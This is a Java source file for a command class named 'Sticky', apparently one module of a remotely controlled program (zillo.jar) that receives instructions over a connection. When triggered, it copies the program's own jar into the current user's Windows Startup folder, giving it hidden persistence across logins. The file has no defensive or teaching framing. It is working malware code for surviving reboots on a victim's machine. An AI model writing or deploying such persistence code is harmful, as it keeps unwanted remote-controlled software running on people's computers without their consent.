package Classes.Instructions;
import Classes.Connection;
import Classes.Instruction;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.HashMap;

public class Sticky extends Instruction {
    public static String type = "sticky";

    public Sticky(Connection connection) {
        super(connection, type);
    }

    public void execute(HashMap<String, Object> arguments, String from) throws IOException {
        System.out.println("Sticky Tease Protocol Executed");

        String homeDirectory = System.getProperty("user.home");

        File userStartup = new File( homeDirectory + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");

        //System.out.println("Common: " + commonStartup.exists());
        System.out.println("User: " + userStartup.exists());

        Path currentRelativePath = Paths.get("");
        String s = currentRelativePath.toAbsolutePath().toString();
        System.out.println("Current relative path is: " + s);

        File getSelf = new File(s + "/zillo.jar");
        if (getSelf.exists()) {
            System.out.println(getSelf);

            String filename = getSelf.getName();

            Files.copy(Paths.get(String.valueOf(getSelf)), new FileOutputStream(userStartup + "/" + filename));
        }
    }
}